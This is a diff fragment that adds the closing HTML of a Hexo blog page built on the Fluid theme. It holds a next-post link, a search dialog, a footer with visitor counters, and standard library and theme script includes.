+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/04/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/">
+                        <span class="hidden-mobile">约束委派</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.2/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      $('#local-search-input').on('click', function() {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      });
+      $('#modalSearch').on('shown.bs.modal', function() {
+        $('#local-search-input').focus();
+      });
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
